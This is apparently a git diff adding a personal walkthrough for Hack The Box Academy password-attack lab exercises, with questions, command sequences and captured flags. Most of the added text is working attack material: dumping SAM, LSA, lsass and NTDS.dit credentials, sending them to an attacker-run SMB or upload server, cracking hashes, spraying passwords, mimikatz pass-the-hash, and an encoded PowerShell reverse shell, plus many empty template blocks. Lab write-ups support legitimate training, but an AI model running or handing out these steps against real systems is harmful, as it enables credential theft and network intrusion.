@@ -2330,21 +2330,726 @@ Results: HTB{P455_Mu7ations}
 **Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: `<username>:<password>)`:**
 
 ```bash
+# Install creds
+git clone https://github.com/ihebski/DefaultCreds-cheat-sheet.git 
+cd DefaultCreds-cheat-sheet 
+pip3 install defaultcreds-cheat-sheet        
+
+# search for default password
+creds search mysql  
+
+# Ssh to the host and try the default passwords
+ssh sam@$ip
+# Enter password: B@tm@n2022!
+
+# Enter Mysql with one of the default password
+mysql -u superdba -padmin
+```
+
+Results: superdba:admin
+
+
+### Windows Local Password Attacks
+
+
+**Where is the SAM database located in the Windows registry? (Format: **\*)**
+Results: hklm\sam
+
+ RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
+ 
+```
+# Connect to the machine
+
+# Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+
+# From your kali attacking machine, mount a smb share
+python3 ./impacket/examples/smbserver.py -smb2support CompData /home/lala/borrar
+
+# From the victim's machine (windows), moves the registries to your attacking machine
+move sam.save \\$ipAttacker\CompData
+move system.save \\$ipAttacker\CompData
+move security.save \\$ipAttacker\CompData
+
+# Dumping Hashes with Impacket's secretsdump.py
+python3 ./impacket/examples/secretsdump.py -sam ~/borrar/sam.save -security ~/borrar/security.save -system ~/borrar/system.save LOCAL
+
+# Results:
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
+# bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
+# jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
+# ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+# frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+
+# Running hascat
+sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt 
+```
+
+```
+# Another way to do it is running crackmapexec from the attacking machine:
+crackmapexec smb 10.129.77.211 --local-auth -u bob -p HTB_@cademy_stdnt! --sam  
+```
+
+Results:  matrix
+
+
+**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)**
+
+```
+crackmapexec smb 10.129.77.211 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
+
+Results: frontdesk:Password123
+
+**What is the name of the executable file associated with the Local Security Authority Process?**
+
+Results:  lsass.exe
+
+**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)**
+
+```
+# `Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`. It's created under:
+ C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP
+ 
+# From our kali we mount a shared unit
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/borrar   
+
+# From the RDP connection open a powershell with Admin rights:
+move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP  \\10.10.15.90\CompData
+
+# Crack the lsass file withPypykatz
+pypykatz lsa minidump ~/borrar/lsass.DMP 
+```
+
+We obtain the following:
+
+```
+== LogonSession ==
+authentication_id 123625 (1e2e9)
+session_id 0
+username Vendor
+domainname FS01
+logon_server FS01
+logon_time 2025-01-17T21:20:58.864952+00:00
+sid S-1-5-21-2288469977-2371064354-2971934342-1003
+luid 123625
+	== MSV ==
+		Username: Vendor
+		Domain: FS01
+		LM: NA
+		NT: 31f87811133bc6aaa75a536e77f64314
+		SHA1: 2b1c560c35923a8936263770a047764d0422caba
+		DPAPI: 0000000000000000000000000000000000000000
+	== WDIGEST [1e2e9]==
+		username Vendor
+		domainname FS01
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: Vendor
+		Domain: FS01
+	== WDIGEST [1e2e9]==
+		username Vendor
+		domainname FS01
+		password None
+		password (hex)
+```
+
+Then we use hashcat:
+
+```bash
+ hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt 
+```
+
+Results: Mic@123
+
+**What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: **.*)**
+
+Resutls: ntds.dit
+
+
+**Submit the NT hash associated with the Administrator user from the example output in the section reading.**
+
+The answer is in the reading materials.
+
+Results: 64f12cddaa88057e06a81b54e73b949b
+
+
+**On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)**
+
+```bash
+# The reading materials reveals the use of the /usr/share/wordlists/fasttrack.txt. We get it from here: https://github.com/drtychai/wordlists/blob/master/fasttrack.txt
+# Create a list of original names called original.txt with:
+John Marston
+Carol Johnson
+Jennifer Stapleton
+
+# Use username Anarchy to obtain combinations of these names for usual username formats:
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+./username-anarchy -i ~/borrar/original.txt 
+
+# Save these names under usernames.txt
+# Enumerate services
+ sudo nmap -sC -sV 10.129.202.85 -Pn 
+
+# Run a password attack:
+crackmapexec winrm 10.129.202.85 -u ~/borrar/usernames.txt -p /usr/share/wordlists/fasttrack.txt --sam
+
+# Results:
+SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
+
+```
+
+Results: jmarston:P@ssword!
+
+
+ Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)
+
+```bash
+# Alternative 1: crackmapexec
+crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds 
+
+# Crack the hash
+hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt 
+```
+
+```
+#  Alternative 2
+
+# 1. Connecting to a DC with Evil-WinRM
+evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
+
+# 2. Checking Local Group Membership
+net localgroup
+
+# 3. Checking User Account Privileges including Domain
+net user $username
+
+# 4. Creating Shadow Copy of C: 
+vssadmin CREATE SHADOW /For=C:
+# Results:
+# Successfully created shadow copy for 'C:\'
+      Shadow Copy ID: {0480243a-8bf0-4af9-a5f5-4a842e49d6c3}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+# 5. Copying NTDS.dit from the VSS
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS.dit
+
+
+# 6. We will also need either the SYSTEM hive or bootkey is required for local parsing. So let's save the system hive
+reg.exe save hklm\system C:\system.save
+
+# 7. Transfer file to attacking machine. For that I will set up a shared unit in the attacker machine:
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/borrar/
+
+# 8. Copy the file from the victim's machine (windows)
+cmd.exe /c move C:\NTDS.dit \\10.10.15.90\CompData
+cmd.exe /c move c:\system.save \\10.10.15.90\CompData
+
+# Extract the NTDS.dit file and crack it with secretsdump:
+python ~/tools/impacket/examples/secretsdump.py -ntds ~/borrar/NTDS.dit  -system ~/borrar/system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+
+# Results:
+[*] Reading and decrypting hashes from /home/lala/borrar/NTDS.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8af61f67a96ac6fb352f192b1cfc6b56:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
+ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
+ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
+ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
+ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
+LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
+[*] Kerberos keys from /home/lala/borrar/NTDS.dit 
+Administrator:aes256-cts-hmac-sha1-96:a2bfeccd55aca0e53f893d1ae43abcdf0d6aa5793cd5d2dbe8c6f577cbbe5a35
+Administrator:aes128-cts-hmac-sha1-96:84a147160d42613b0ffe0bd060dbca9c
+Administrator:des-cbc-md5:3ec8540110d3e058
+ILF-DC01$:aes256-cts-hmac-sha1-96:50d1401419bf8fe68aa149e67f327af59fc923653e3ebe212345883a3b92bb2d
+ILF-DC01$:aes128-cts-hmac-sha1-96:f16761d510325e2640b31a9ef9e5350a
+ILF-DC01$:des-cbc-md5:f20b1ae0e0f2986b
+krbtgt:aes256-cts-hmac-sha1-96:4c3efde4c6ef4005e67a3d9aa09d91d9325518443e54a914f83839a2ed7d02ec
+krbtgt:aes128-cts-hmac-sha1-96:69ef62ae6a467bca3e3aa07495b81a64
+krbtgt:des-cbc-md5:6e1fa8f219daa82c
+ILF.local\jmarston:aes256-cts-hmac-sha1-96:9e7d0ec693ff443437aae379ee87d07ed42d6745a4eab784eaa54ceff2fa2649
+ILF.local\jmarston:aes128-cts-hmac-sha1-96:b106cf089340b2e610710d6a89ea890d
+ILF.local\jmarston:des-cbc-md5:5e5dc24ff73ee9a8
+ILF.local\cjohnson:aes256-cts-hmac-sha1-96:2d332798b58ed1a9611e2ecabb338aec01fab4519b08ce4986ebc405c851d7fc
+ILF.local\cjohnson:aes128-cts-hmac-sha1-96:cf66ade75cbc1c17d55d6abae64a77f3
+ILF.local\cjohnson:des-cbc-md5:83f8cbe3386d858a
+ILF.local\jstapleton:aes256-cts-hmac-sha1-96:bf06c080a3e7975799a9f58b606fef8a4b2c4f574cb9e7e99c0686971850ca64
+ILF.local\jstapleton:aes128-cts-hmac-sha1-96:828fbbc322f3929f1fe164bcae50e310
+ILF.local\jstapleton:des-cbc-md5:d057ad893d8a6b2f
+ILF.local\gwaffle:aes256-cts-hmac-sha1-96:b3a7e81c743c8457ba643a5c63058af6f8d21f2a71c793ff7058e73f82ff45a0
+ILF.local\gwaffle:aes128-cts-hmac-sha1-96:76943b80314d6f172ed66bb7a4ed72ad
+ILF.local\gwaffle:des-cbc-md5:8668a2d073764a3e
+LAPTOP01$:aes256-cts-hmac-sha1-96:e0b95703b96705adaf6b5ddadb1f9896729e75683e99f55a6c7bf31e32c3a6d0
+LAPTOP01$:aes128-cts-hmac-sha1-96:f42fef661ee76d7e5d2062443e569d5d
+LAPTOP01$:des-cbc-md5:26ade5ce709bb5e5
+
+# Crack the hashes
+# For AES256-CTS-HMAC-SHA1-96
+
+```
+
+Results: Winter2008
+
+
+**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!" What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)**
+
+```bash
+# Open the excel file under C:\Users\bob\Desktop\WorkStuff\Creds
+# Results: admin:WellConnected123
+# bwilliamson:P@55w0rd!
+```
+
+Results: WellConnected123
+
+
+**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What is the GitLab access code Bob uses? (Format: Case-Sensitive)**
+
+```bash
+# Open the folder WorkStuff available in desktop and open the file GitlabAccessCodeJustIncase
+```
+
+Results: 3z1ePfGbjWPsTfCsZfjy
+
+
+**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)**
+
+```bash
+# Copy lazagne to the windows machine. For instance, to Bob's Desktop and run it
+start .\lazagne.exe all
+# [+] Password found !!!
+# URL: 10.129.202.64
+# Login: ubuntu
+# Password: FSadmin123
+# Port: 22     
+```
+
+Results: ubuntu:FSadmin123
+
+
+**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!".  What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)**
+
+```bash
+# Alternative 1:
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass"
+
+# Alternative 2:
+ Querying patterns of files with findstr
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+
+# The first result we obtain is c:\Automations&Scripts\BulkaddADusers.ps1
+type 'C:\Automations&Scripts\BulkaddADusers.ps1'
+# And we check that the default password is set to Inlanefreightisgreat2022
+```
+
+Results: Inlanefreightisgreat2022
+
+
+**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)**
+
+```
+# We search the string Edge-Router
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "Edge-Router"
+
+# We obtain as results:
+Automations&Scripts\AnsibleScripts\EdgeRouterConfigs
+
+# We open that file and retrieve username and password
+edgeadmin:Edge@dmin123!
+```
+
+Results: edgeadmin:Edge@dmin123!
+
+
+### Linux Local Password Attacks
+
+**Examine the target and find out the password of the user Will. Then, submit the password as the answer.**
+
+```bash
+# Enumerate services
+sudo nmap -sC -sV ~ip -Pn
+# We obtain open services: ftp, ssh and smb
+
+# The hint offers us the creds: Kira:LoveYou1. However they do not work on the existing services. We need to mutate a little the password list provided by HTB in resources.
+echo LoveYou1 > originalpass.txt
+hashcat --force originalpass.txt -r custom.rule --stdout | sort -u > mutatedlist.list
+
+# Now we launch our attack:
+hydra -l kira -P mutatedlist.list ssh://10.129.229.2
+# Results: [22][ssh] host: 10.129.229.2   login: kira   password: L0vey0u1!
+
+ssh kira@$ip
+# Enter the password: L0vey0u1!
+
+# Serve the  firefox_decrypt.py from your kali
+python3 -m http.server 8001
+
+# Download it into the target machine
+wget http://$IPAtacker:8001/firefox_decrypt.py
+
+# Now run it:
+python3.9 firefox_decrypt.py
+# Results:
+# Website:   https://dev.inlanefreight.com
+# Username: 'will@inlanefreight.htb'
+# Password: 'TUqr7QfLTLhruhVbCP'
+
+```
+
+Results: TUqr7QfLTLhruhVbCP
+
+**Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.**
+
+```
+# After browsing the file system we notice files passwd.bak and shadow.bak under /home/will/.backups/. We will try to unshadow those files, but for that we need to transfer them to our attacker machine. 
+
+# We will use uploadserver. In our attacker machine, as we will use https, we will create a self-signed certificate.
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+#  The webserver should not host the certificate. We create a new directory to host the file for our webserver.
+mkdir https && cd https
+
+# We start the web server in out attacker machine
+python3 -m uploadserver 443 --server-certificate ~/borrar/server.pem
+
+# Now from our compromised machine, let's upload the   `passwd.bak` and `shadow.bak`  files.
+curl -X POST http://$ipAttackerMachine/upload -F 'files=@/home/will/.backups/passwd.bak' -F 'files=@/home/will/.backups/shadow.bak' --insecure
+# We used the option --insecure because we used a self-signed certificate that we trust.
+
+# Now we unshadow those files:
+unshadow passwd.bak shadow.bak > unshadowed.hashes
+
+# And crack them:
+hashcat -m 1800 -a 3 unshadowed.hashes /usr/share/wordlists/rockyou.txt -o unshadowed.cracked
+```
+
+Results: J0rd@n5
+
+### Windows Lateral Movement
+
+
+**Authenticate to  with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453". Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.**
+
+```powershell
+xfreerdp /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /v:$ip
+impacket-psexec Administrator@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+Results: `G3t_4CCE$$_V1@_PTH`
+
+
+
+**Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.**
+
+```powershell
+# When trying to access with
+xfreerdp /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /v:$ip
+# we obtained an error message as it was in Restricted Admin Mode. In the connection we already have we change the registry
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+# And now we can access viar RDP
+```
+
+Results: DisableRestrictedAdmin
+
+
+
+**RDP to with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453". Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?**
+
+```powershell
+ .\mimikatz.exe privilege::debug "sekurlsa::logonPasswords full" exit  
+```
+
+Results: c39f2beb3d2ec06a62cb887fb391dee0
+
+
+
+**Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.**
+
+```powershell
+# Alternative #1: mimikatz
+# From the RDP connection we have, from powershell terminal:
+.\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /NTLM:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit     
+
+# A terminal cmd.exe opens. Run
+dir \\DC01\david
+type \\DC01\david\david.txt
+```
+
+Results: D3V1d_Fl5g_is_Her3
+
+
+
+**Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.**
+
+```powershell
+# Alternative #1: mimikatz
+# From the RDP connection we have, from powershell terminal:
+.\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit  
+
+# A terminal cmd.exe opens. Run
+dir \\DC01\julio
+type \\DC01\julio\julio.txt
+```
+
+Results: JuL1()_SH@re_fl@g
+
+
+
+**Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.**
+
+```powershell
+# We wnumerate the possible IPs for DC fron our RDP connection
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+# It might be 172.16.1.10
+
+# In the running RDP connection we have we will open a powershell terminal as julio, by using mimikatz and a passthehash
+.\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:powershell.exe" exit  
+
+# We will do the same to have a cmd.exe running as julio
+.\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit  
+
+# In the cmd.exe we will browse to tools and set a netcat listener on port 1234
+
+# In the powershell terminal, browse to tools
+cd c:\tools\Invoke-TheHash
+Import-Module .\Invoke-TheHash.psd1
+
+# We will launch the InvoketheHash with a reverse shell
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlafreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAMQAyADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -Verbose
+
+# In the cmd terminal we have obtained a reverse shell. Print the flag:
+type C:\julio\flag.txt
+```
+
+Results: JuL1()_N3w_fl@g
+
+
+
+**Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.**
+
+```powershell
+impacket-psexec john@$ip -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
+evil-winrm -i $ip -u john -H 'c4b0e1b10c7ce2c4723b4e2407ef81a2'
+```
+
+Results: DONE
+
+
+RDP to with user "Administrator" and password `AnotherC0mpl3xP4$$`.  Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?
+
+```powershell
 
 ```
 
 Results:
 
 
-### Windows Local Password Attacks
+
+Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john
+
+Invoke-SMBExec -Target 172.16.1.1 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command "dir C:\" -Verbose
+john
+c4b0e1b10c7ce2c4723b4e2407ef81a2
+
+julio
+64f12cddaa88057e06a81b54e73b949b 
+
+david
+c39f2beb3d2ec06a62cb887fb391dee0
+```powershell
+
+```
+
+Results:
 
 
 
-### Linux Local Password Attacks
+Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
+
+```powershell
+
+```
+
+Results:
 
 
-### Windows Lateral Movement
 
+Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
+
+
+
+Question
+
+```powershell
+
+```
+
+Results:
 
 
 ### Cracking Files
